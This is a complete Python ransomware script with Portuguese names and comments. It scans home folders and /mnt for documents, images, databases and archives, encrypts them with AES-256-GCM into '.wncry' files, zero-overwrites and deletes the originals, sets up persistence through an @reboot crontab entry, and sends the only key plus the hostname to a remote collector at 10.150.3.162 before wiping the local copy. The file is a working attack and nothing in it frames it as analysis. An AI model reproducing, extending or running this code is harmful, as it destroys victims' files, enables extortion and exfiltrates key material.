import os
import pathlib
import json
import base64
import secrets
import errno
import socket
import sys
import subprocess
from typing import List

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def enumerar_arquivos_alvo() -> List[str]:
    """
    Percorre recursivamente diretórios de interesse do usuário e devolve os caminhos
    completos de arquivos cujas extensões estejam na lista permitida.

    Diretórios percorridos:
        - ~/Home
        - ~/Documentos
        - ~/Área de Trabalho
        - ~/Imagens
        - ~/Downloads
        - ~/Documentos_Teste
        - /mnt

    Extensões aceitas (case‑insensitive):
        .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png,
        .db, .backup, .psd, .zip, .rar

    Retorna
    -------
    List[str]
        Lista contendo os caminhos absolutos de todos os arquivos encontrados.
        Diretórios inacessíveis ou inexistentes são ignorados, permitindo que a
        varredura continue nos demais caminhos.
    """
    extensoes_permitidas = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg", ".png", ".db", ".backup", ".psd",
        ".zip", ".rar"
    }

    caminhos_base = [
        "~/Home",
        "~/Documentos",
        "~/Área de Trabalho",
        "~/Imagens",
        "~/Downloads",
        "~/Documentos_Teste",
        "/mnt"
    ]

    arquivos_encontrados: List[str] = []

    for caminho_str in caminhos_base:
        caminho = pathlib.Path(caminho_str).expanduser()
        if not caminho.exists():
            continue

        for raiz, dirs, arquivos in os.walk(caminho, onerror=lambda e: None):
            # remover diretórios que não podem ser acessados impede recursão posterior
            dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(raiz, d))]
            for nome_arquivo in arquivos:
                caminho_completo = pathlib.Path(raiz) / nome_arquivo
                if caminho_completo.suffix.lower() in extensoes_permitidas:
                    arquivos_encontrados.append(str(caminho_completo.resolve()))

    return arquivos_encontrados


def gerar_e_salvar_chave_mae() -> str:
    """
    Gera uma chave AES‑256 (32 bytes), codifica em Base64,
    salva em /tmp/.master.key como JSON e retorna a chave em Base64.
    O arquivo é criado com permissão 0o600 (leitura/escrita apenas pelo dono).
    """
    try:
        # 1. Gerar 32 bytes de forma criptograficamente segura
        chave_bytes = secrets.token_bytes(32)

        # 2. Codificar em Base64 (string sem quebras de linha)
        chave_b64 = base64.b64encode(chave_bytes).decode('utf-8')

        # 3. Criar objeto JSON
        data = {"aes_key": chave_b64}
        json_str = json.dumps(data, separators=(',', ':'))

        # 4. Caminho do arquivo
        caminho = '/tmp/.master.key'

        # Abrir o arquivo de forma atômica e garantir permissão 0o600
        fd = os.open(caminho, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, 'w') as f:
            f.write(json_str)

        # Garantir permissão caso o sistema não a tenha aplicado
        try:
            os.chmod(caminho, 0o600)
        except OSError:
            pass

        return chave_b64

    except Exception as e:
        raise RuntimeError(f"Falha ao gerar e salvar a chave mestra: {e}") from e


def criptografar_arquivo_com_chave(caminho_arquivo: str, chave_mestre: bytes) -> None:
    """
    Criptografa o arquivo indicado usando AES‑256‑GCM, grava o resultado em
    um novo arquivo com extensão .wncry (nonce||cifra), sobrescreve o arquivo
    original com zeros e o remove.
    """
    if not isinstance(chave_mestre, (bytes, bytearray)) or len(chave_mestre) != 32:
        raise ValueError("chave_mestre deve ser bytes de 32 bytes para AES‑256‑GCM")

    origem = pathlib.Path(caminho_arquivo)
    if not origem.is_file():
        raise FileNotFoundError(f"Arquivo não encontrado: {caminho_arquivo}")

    nonce = os.urandom(12)
    aesgcm = AESGCM(chave_mestre)

    try:
        with origem.open('rb') as f_in:
            plaintext = f_in.read()
    except Exception as e:
        raise IOError(f"Erro ao ler o arquivo {caminho_arquivo}: {e}")

    try:
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    except Exception as e:
        raise RuntimeError(f"Falha na criptografia: {e}")

    destino = origem.with_suffix('.wncry')
    try:
        with destino.open('wb') as f_out:
            f_out.write(nonce + ciphertext)
    except Exception as e:
        raise IOError(f"Erro ao escrever o arquivo criptografado {destino}: {e}")

    try:
        with origem.open('r+b') as f_orig:
            f_orig.seek(0)
            f_orig.write(b'\x00' * len(plaintext))
            f_orig.flush()
            os.fsync(f_orig.fileno())
    except Exception as e:
        raise IOError(f"Erro ao sobrescrever o arquivo original {caminho_arquivo}: {e}")

    try:
        origem.unlink()
    except Exception as e:
        raise OSError(f"Erro ao remover o arquivo original {caminho_arquivo}: {e}")


def exfiltrar_material_da_chave() -> bool:
    """
    Reads AES key from /tmp/.master.key, sends it with the hostname to a remote
    collector, and securely deletes the key file after a successful transmission.
    Returns True on success, False otherwise.
    """
    key_path = pathlib.Path("/tmp/.master.key")
    if not key_path.is_file():
        sys.stderr.write(f"File not found: {key_path}\n")
        return False

    try:
        with key_path.open("r", encoding="utf-8") as f:
            data = json.load(f)
        aes_key = data["aes_key"]
    except (OSError, json.JSONDecodeError, KeyError) as e:
        sys.stderr.write(f"Error reading aes_key: {e}\n")
        return False

    try:
        hostname = socket.gethostname()
    except Exception as e:
        sys.stderr.write(f"Error obtaining hostname: {e}\n")
        return False

    payload = {"aes_key": aes_key, "hostname": hostname}
    url = "http://10.150.3.162:8080/collect"
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        sys.stderr.write(f"Network error: {e}\n")
        return False

    try:
        length = key_path.stat().st_size
        with key_path.open("r+b") as f:
            f.seek(0)
            f.write(b"\x00" * length)
            f.flush()
            os.fsync(f.fileno())
        key_path.unlink()
    except OSError as e:
        sys.stderr.write(f"Error securely deleting file: {e}\n")
        return False

    return True


def _read_current_crontab() -> List[str]:
    """
    Returns the current crontab lines as a list.
    If the user has no crontab, returns an empty list.
    """
    try:
        result = subprocess.run(
            ["crontab", "-l"],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            return []
        return [line.rstrip("\n") for line in result.stdout.splitlines()]
    except Exception as exc:
        raise RuntimeError(f"Error reading crontab: {exc}") from exc


def _write_crontab(lines: List[str]) -> None:
    """
    Writes the given lines to the user's crontab.
    """
    content = "\n".join(lines) + ("\n" if lines else "")
    try:
        subprocess.run(
            ["crontab", "-"],
            input=content,
            text=True,
            capture_output=True,
            check=True,
        )
    except subprocess.CalledProcessError as exc:
        raise RuntimeError(f"Error writing crontab: {exc.stderr}") from exc
    except Exception as exc:
        raise RuntimeError(f"Unexpected error writing crontab: {exc}") from exc


def registrar_persistencia_cron(comando: str) -> str:
    """
    Guarantees that '@reboot <comando>' is present in the current user's crontab.

    Returns:
        "added"            – the entry was inserted.
        "already present" – the entry was already there.
    Raises:
        RuntimeError on any failure to read or write the crontab.
    """
    if not comando:
        raise ValueError("O parâmetro 'comando' não pode ser vazio.")

    current_lines = _read_current_crontab()
    target = f"@reboot {comando}".strip()

    for line in current_lines:
        if line.strip() == target:
            return "already present"

    new_lines = current_lines + [target]
    _write_crontab(new_lines)
    return "added"


def main() -> None:
    # 1. Gerar e salvar a chave mestra
    chave_b64 = gerar_e_salvar_chave_mae()
    chave_bytes = base64.b64decode(chave_b64)

    # 2. Enumerar arquivos alvo
    arquivos = enumerar_arquivos_alvo()
    print(f"Total de arquivos encontrados: {len(arquivos)}")

    # 3. Criptografar cada arquivo
    for caminho in arquivos:
        try:
            criptografar_arquivo_com_chave(caminho, chave_bytes)
            print(f"Arquivo criptografado: {caminho}")
        except Exception as e:
            print(f"Erro ao criptografar {caminho}: {e}", file=sys.stderr)

    # 4. Registrar persistência via cron
    script_path = pathlib.Path(__file__).resolve()
    try:
        status = registrar_persistencia_cron(str(script_path))
        print(f"Persistência cron @reboot: {status}")
    except Exception as e:
        print(f"Falha ao registrar persistência: {e}", file=sys.stderr)

    # 5. Exfiltrar a chave mestra e remover o arquivo de chave
    if exfiltrar_material_da_chave():
        print("Exfiltração concluída com sucesso.")
    else:
        print("Exfiltração falhou.", file=sys.stderr)


if __name__ == "__main__":
    main()